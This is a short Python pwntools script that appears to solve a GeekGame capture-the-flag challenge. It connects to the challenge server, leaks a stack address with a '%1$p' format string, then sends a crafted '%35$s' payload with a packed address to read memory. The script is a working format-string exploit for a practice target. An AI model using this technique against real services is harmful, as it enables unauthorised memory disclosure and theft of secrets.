from pwn import *

conn = connect("prob09.geekgame.pku.edu.cn", "10009")
conn.recvuntil(b"Please input your token: ")
conn.send(b"MY TOKEN\n")
conn.recvuntil(b'Please input your instruction:\n')
conn.sendline(b'%1$p')
line = conn.recvline().decode("utf8", "ignore")
addr = int(line[2:], 16) + 0x40
conn.recvuntil(b'Please input your instruction:\n')
conn.sendline(b'%35$s'.ljust(0x08, b'a') + p64(addr))
line = conn.recvline().decode("utf8", "ignore")
print(line)
conn.close()